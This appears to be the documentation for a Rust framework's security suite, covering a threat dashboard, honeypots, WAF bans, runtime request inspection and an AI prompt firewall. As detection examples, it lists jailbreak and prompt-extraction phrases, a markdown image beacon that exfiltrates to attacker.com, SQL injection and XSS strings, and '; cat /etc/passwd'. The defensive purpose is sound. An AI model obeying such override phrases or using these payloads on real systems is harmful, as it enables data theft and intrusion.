# Rullst Threat Radar & Security SOC Master Guide 🛡️

This guide provides an exhaustive, beginner-to-advanced, and production-ready explanation of the **Threat Radar SOC** dashboards and underlying security engines in **Rullst Nexus** (`/nexus/security`) and **Rullst Studio** (`/studio/security`, `/studio/radar`).

---

## 📐 Table of Contents

1. [Architectural Overview & Zero-Trust Defense](#1-architectural-overview--zero-trust-defense)
2. [Rullst Nexus Threat Radar SOC Dashboard (`/nexus/security`)](#2-rullst-nexus-threat-radar-soc-dashboard-nexussecurity)
   - [Primary Metric Cards Deep Dive](#primary-metric-cards-deep-dive)
   - [AI Security Sentinel & Prompt Injection Shield v2](#ai-security-sentinel--prompt-injection-shield-v2)
   - [Active WAF Banned IP Addresses & Honeypot Tables](#active-waf-banned-ip-addresses--honeypot-tables)
   - [Live HMAC SHA-256 Security Audit Trail Log Stream](#live-hmac-sha-256-security-audit-trail-log-stream)
3. [Rullst Studio Visual Threat Radar (`/studio/security`)](#3-rullst-studio-visual-threat-radar-studiosecurity)
   - [Engine Status Indicators](#engine-status-indicators)
   - [Universal LLM Provider Configuration Guide](#universal-llm-provider-configuration-guide)
   - [Built-In Security & Guardrails Matrix](#built-in-security--guardrails-matrix)
4. [Underlying Security Engines & Code Mechanics](#4-underlying-security-engines--code-mechanics)
   - [Anti-Timing Attack User Enumeration Guard (`rullst-security::timing_guard`)](#anti-timing-attack-user-enumeration-guard-rullst-securitytiming_guard)
   - [LLM AI Firewall & Multi-Vector Jailbreak Shield v2 (`rullst-security::ai_firewall`)](#llm-ai-firewall--multi-vector-jailbreak-shield-v2-rullst-securityai_firewall)
   - [Outbound Phishing & Homograph Domain Interceptor](#outbound-phishing--homograph-domain-interceptor)
   - [RASP (Runtime Application Self-Protection)](#rasp-runtime-application-self-protection)
   - [OWASP Secure Headers Suite A+](#owasp-secure-headers-suite-a)
   - [Anti-Bruteforce Tarpit & Login Jail](#anti-bruteforce-tarpit--login-jail)
   - [HTTP & Email Outbound DLP Interceptor](#http--email-outbound-dlp-interceptor)
   - [Honeypot Deception & Concurrent WAF Banning](#honeypot-deception--concurrent-waf-banning)
   - [HMAC SHA-256 Cryptographic Audit Ledger](#hmac-sha-256-cryptographic-audit-ledger)
5. [Real-World Attack Scenarios & Automated Mitigations](#5-real-world-attack-scenarios--automated-mitigations)
6. [Local Testing & Verification Walkthrough](#6-local-testing--verification-walkthrough)
7. [Frequently Asked Questions (FAQ)](#7-frequently-asked-questions-faq)
8. [Production Deployment Checklist](#8-production-deployment-checklist)

---

## 1. Architectural Overview & Zero-Trust Defense

Rullst adopts a **Zero-Trust Application Self-Protection** model. Rather than relying on external web application firewalls (WAFs), reverse proxies, or heavy agent daemons, Rullst embeds threat detection, honeypot deception traps, input sanitization, timing guards, and cryptographic audit ledgers directly inside the compiled Rust binary.

### Key Architectural Pillars:
* **Zero Latency**: Threat inspection happens in asynchronous Rust middleware layers (`tower::Layer` and `axum::middleware`), introducing less than **15 microseconds (µs)** of overhead per request.
* **Lock-Free Concurrency**: IP blacklists and route counters utilize lock-free concurrent hash maps (`dashmap::DashMap`) and atomic counters (`std::sync::atomic::AtomicU64`), ensuring zero thread contention even under 100,000+ requests per second.
* **Tamper-Proof Audit Chain**: Security events are signed sequentially with HMAC SHA-256, forming a cryptographic block ledger that guarantees audit logs cannot be modified or deleted without detection.
* **Side-Channel Timing Protection**: Normalizes login and password-reset response durations with synthetic Argon2 CPU cycles and micro-jitter, eliminating user enumeration.

---

## 2. Rullst Nexus Threat Radar SOC Dashboard (`/nexus/security`)

Accessed at `http://127.0.0.1:3000/nexus/security` (or `/nexus/security` on any deployed Rullst application), this dashboard provides operational control and visual monitoring of active threats.

```text
┌──────────────────────────────────────────────────────────────────────────────────────────────────┐
│ 🛡️ Threat Radar & RASP Security SOC [LIVE REAL TELEMETRY]                    [Active: Gemini]  │
├──────────────────────────┬─────────────────────────┬──────────────────────────┬──────────────────┤
│ HONEYPOT TRAPS TRIGGERED │ ACTIVE BANNED IPS       │ PROMPT INJECTIONS BLOCKED│ XSS SANITIZATIONS│
│ 0                        │ 0                       │ 0                        │ 0                │
└──────────────────────────┴─────────────────────────┴──────────────────────────┴──────────────────┘
```

### Primary Metric Cards Deep Dive

#### 1. Honeypot Traps Triggered
* **Definition**: The total number of times automated web crawlers, vulnerability scanners, or attackers send HTTP requests to synthetic trap endpoints (such as `/.env`, `/admin.php`, `/wp-login.php`, or `/.git/config`).
* **Initial State**: Displays `0` on application startup.
* **Live Behavior**: Increments automatically the moment a request hits any trap route. The attacker's IP address is immediately captured and banned.

#### 2. Active Banned IPs (WAF)
* **Definition**: The real-time count of IP addresses blacklisted by Rullst's embedded Web Application Firewall.
* **Initial State**: Displays `0` on clean startup.
* **Live Behavior**: When an IP attempts an attack or touches a honeypot, its address is added to the in-memory WAF ban list. All subsequent requests from that IP are rejected at the edge with a `403 Forbidden` status.

#### 3. Prompt Injections Blocked
* **Definition**: Total count of adversarial prompt injection attempts, system prompt overrides, or DAN (Do Anything Now) jailbreak patterns intercepted by `rullst-security::ai_firewall`.

#### 4. XSS / Sanitizations
* **Definition**: Total count of unsanitized HTML payloads or dangerous script tags neutralized across form inputs and API parameters.

---

### 🤖 AI Security Sentinel & Prompt Injection Shield v2

| Metric | Description | Source / Code Trigger |
|---|---|---|
| **Prompts Inspected** | Total count of queries evaluated by the AI Sentinel guardrail engine. | `SecurityStore::global().record_prompt_inspected()` |
| **Injections Blocked** | Count of malicious prompts prevented from reaching the LLM model. | `SecurityStore::global().record_prompt_injection_blocked()` |
| **PII Data Masked** | Count of sensitive data fields (email addresses, credit card numbers, tax IDs) masked before hitting cloud APIs. | `SecurityStore::global().record_pii_masked(count)` |
| **HMAC Audit Chain** | Displays `100% VERIFIED` confirming that HMAC SHA-256 log chain signatures match without tampering. | `AuditChain::verify_record()` |

---

### 🚫 Active WAF Banned IP Addresses & Honeypot Tables

#### Active WAF Banned IP Addresses Table
Displays a real-time list of blacklisted IPs:
* **Clean State**: Shows *"No IP addresses currently banned by WAF."*
* **Active Attack State**: Shows rows with IP address (e.g., `198.51.100.42`), violation reason (e.g., *"Triggered honeypot route /.env"*), and timestamp.

#### Active Honeypot Traps Table
Displays monitored trap endpoints and real-time hit counters:
* `/.env` — Armed (Catches environment file scanners)
* `/admin.php` — Armed (Catches legacy PHP exploit bots)
* `/wp-login.php` — Armed (Catches WordPress brute-force scanners)
* `/.git/config` — Armed (Catches repository exposure scanners)

---

### 📜 Live HMAC SHA-256 Security Audit Trail Log Stream

Every security incident generates a cryptographically signed audit log entry:

```text
[VERIFIED] HONEYPOT_TRAP_TRIGGERED   IP 198.51.100.42 attempted scanning /.env          Just now
[VERIFIED] XSS_PAYLOAD_NEUTRALIZED   Sanitizer stripped <script> tag from input payload 3m ago
[VERIFIED] AI_PROMPT_INJECTION       Blocked prompt attempt matching jailbreak pattern  12m ago
```

---

## 3. Rullst Studio Visual Threat Radar (`/studio/security`)

Accessed at `http://127.0.0.1:5555/studio/security` (clean URL standard), this dashboard provides developers with a high-level visual telemetry map of framework defenses.

### Engine Status Indicators

| Indicator | Status Text | Meaning |
|---|---|---|
| **RASP ENGINE** | `ACTIVE` | Zero-panic memory protection inspecting HTTP targets for SQL Injection (`UNION SELECT`), Path Traversal (`../`), SSRF (`169.254.169.254`), and RCE (`; cat /etc/passwd`). |
| **AI FIREWALL v2** | `ACTIVE: [Provider]` | Intercepts direct jailbreaks, tokenizer delimiter collisions, Markdown image beacons, and zero-width unicode poisoning. |
| **TIMING GUARD** | `ACTIVE` | Normalizes authentication response times with synthetic Argon2 CPU cycles to prevent user enumeration. |
| **HMAC AUDIT TRAIL** | `VERIFIED` | Confirms cryptographic ledger integrity using SHA-256 HMAC signatures. |
| **HONEYPOT TRAPS** | `ARMED` | Confirms active background interception of synthetic vulnerability routes. |

---

## 4. Underlying Security Engines & Code Mechanics

### Anti-Timing Attack User Enumeration Guard (`rullst-security::timing_guard`)

Implemented in `rullst-security/src/timing_guard.rs`:
```rust
let config = TimingGuardConfig::default(); // target: 350ms, jitter: ±25ms

// In authentication / password reset handler:
let scope = TimingScope::start(&config);

let user = find_user_by_email(&email).await;
if user.is_none() {
    // Burn exact CPU cycles equivalent to Argon2 password hashing on non-existent users
    scope.burn_synthetic_argon2_cycles();
}

// Normalizes duration to exactly 350ms ± jitter
scope.equalize().await;
```

---

### LLM AI Firewall & Multi-Vector Jailbreak Shield v2 (`rullst-security::ai_firewall`)

Implemented in `rullst-security/src/ai_firewall.rs`:
Scrutinizes incoming prompts across multiple threat vectors:
1. **Direct Jailbreaks**: `Ignore previous instructions`, `DAN mode`, `Developer Mode enabled`.
2. **System Prompt Exfiltration**: `Print system prompt`, `Repeat instructions above`.
3. **Tokenizer Delimiter Collisions**: `<|im_start|>`, `[INST]`, `<|endoftext|>`.
4. **Markdown Image Exfiltration Beacons**: `![data](https://attacker.com?token=...)`.
5. **Invisible Unicode Poisoning**: Zero-width joiners and hidden non-printable characters.

---

### Outbound Phishing & Homograph Domain Interceptor

Implemented in `rullst-security` and `rullst-mail`:
Scans outgoing HTTP links and email HTML bodies for:
* **Mixed-Script Homographs**: Identifies lookalike domains combining Cyrillic/Greek glyphs with Latin characters (e.g. `pаypal.com`).
* **Dangerous URI Schemes**: Intercepts `javascript:`, `data:text/html`, `vbscript:`.

---

### RASP (Runtime Application Self-Protection)

Implemented in `rullst-security/src/rasp.rs`:
Inspects request URIs and headers for SQL Injection, Path Traversal, SSRF, RCE, and Log4j/JNDI exploits before business logic executes.

---

### OWASP Secure Headers Suite A+

Implemented in `rullst-security/src/headers.rs`:
Injects HSTS, CSP Nonce, Permissions-Policy, COOP, COEP, and CORP, guaranteeing an out-of-the-box **A+ score** on `securityheaders.com`.

---

### Anti-Bruteforce Tarpit & Login Jail

Implemented in `rullst-security/src/login_guard.rs`:
Progressively introduces artificial network delays on repeated authentication failures and jails aggressive IPs for 15 minutes.

---

### HTTP & Email Outbound DLP Interceptor

Implemented in `rullst-security/src/dlp.rs` and `rullst-mail/src/message.rs`:
Inspects outgoing HTTP payloads and transactional emails to automatically mask AWS credentials (`AKIA...`), database connection strings, and private RSA keys.

---

### Honeypot Deception & Concurrent WAF Banning

Implemented in `rullst-security/src/honey/middleware.rs`:
Traps scanners querying synthetic vulnerability routes (`/.env`, `/wp-login.php`), blacklisting the offender's IP in an edge `DashMap`.

---

### HMAC SHA-256 Cryptographic Audit Ledger

Implemented in `rullst-security/src/audit/chain.rs`:
Signs sequential audit events into an immutable cryptographic chain to detect any database tampering.

---

## 5. Real-World Attack Scenarios & Automated Mitigations

| Attack Scenario | Attacker Action | Rullst Automated Protection Mechanism | Outcome in Threat Radar SOC |
|---|---|---|---|
| **Timing User Enumeration** | Attacker measures response time on `/login` to discover valid emails. | `TimingScope` normalizes duration with synthetic Argon2 CPU cycles. | • Response times are identical for existing and non-existing accounts.<br>• Side-channel user enumeration mathematically eliminated. |
| **Prompt Injection v2** | Attacker sends delimiter collision `<\|im_start\|>system`. | `LlmFirewall` intercepts token boundary override. | • Prompt Injections Blocked count increments.<br>• `AI_PROMPT_INJECTION_SHIELDED` audit event logged. |
| **Vulnerability Scanner** | Automated bot requests `http://yourapp.com/.env` or `/admin.php`. | `HoneypotLayer` catches synthetic route request. | • Honeypot Traps count increments.<br>• Attacker IP is added to Active Banned IPs. |
| **SQL Injection (SQLi)** | Attacker submits `?search=1' UNION SELECT * FROM users--`. | `RaspInspector` flags SQLi pattern AND `rullst-orm` uses parameterized `$1` bindings. | • RASP blocks request with 403.<br>• Query is never executed against database. |
| **Cross-Site Scripting (XSS)** | User submits comment containing `<script>document.cookie</script>`. | `HtmlSanitizer` strips unsafe tags and attributes. | • XSS Sanitizations count increments.<br>• `XSS_PAYLOAD_NEUTRALIZED` audit event logged. |

---

## 6. Local Testing & Verification Walkthrough

You can test Rullst Threat Radar locally using terminal commands:

### Step 1: Start Your Rullst Application
```bash
cargo rullst dash
```

### Step 2: Test Honeypot Interception & IP Banning
Open a second terminal window and run:
```bash
curl -i http://127.0.0.1:3000/.env
```
**Expected Output**:
```http
HTTP/1.1 403 Forbidden
content-type: text/plain

Access Denied: Honeypot Trap Triggered
```

### Step 3: Verify Threat Radar Dashboard Updates
Open `http://127.0.0.1:3000/nexus/security` in your browser:
* **Honeypot Traps Triggered**: Increments to `1`.
* **Active Banned IPs**: Increments to `1` (displaying `127.0.0.1`).
* **Active Honeypot Traps**: `/.env` displays `1 hits`.
* **Audit Stream**: Displays a new `HONEYPOT_TRAP_TRIGGERED` row with the green `HMAC VERIFIED` badge.

---

## 7. Frequently Asked Questions (FAQ)

#### Q: Will Honeypot traps block legitimate users?
**A**: No. Legitimate users only navigate valid application routes generated by your controllers. Synthetic trap routes (`/.env`, `/admin.php`, `/wp-login.php`, etc.) do not exist in valid UI navigation and are only probed by automated malicious scanners.

#### Q: How does Rullst handle client IPs behind proxies or Cloudflare?
**A**: `HoneypotService` inspects the `X-Forwarded-For` and `CF-Connecting-IP` headers to extract the true client IP address.

#### Q: What is the performance overhead of Threat Radar and RASP?
**A**: Extremely low. Threat checks run in asynchronous Rust (`tokio`), introducing **less than 15 microseconds** of latency per request. Memory overhead is minimal (~14 MB total RSS process memory).

---

## 8. Production Deployment Checklist

- [ ] **1. Set LLM Credentials in `.env`**: Configure `GEMINI_API_KEY`, `OPENAI_API_KEY`, or `OLLAMA_HOST`.
- [ ] **2. Enable Nexus Authentication**: Use `.with_auth("admin", "your_strong_password")` in your `Nexus::new()` builder.
- [ ] **3. Inspect Threat Radar**: Navigate to `/nexus/security` to verify that Honeypots are armed and RASP is active.
- [ ] **4. Verify Timing Guards**: Ensure authentication endpoints use `timing_guard_middleware`.
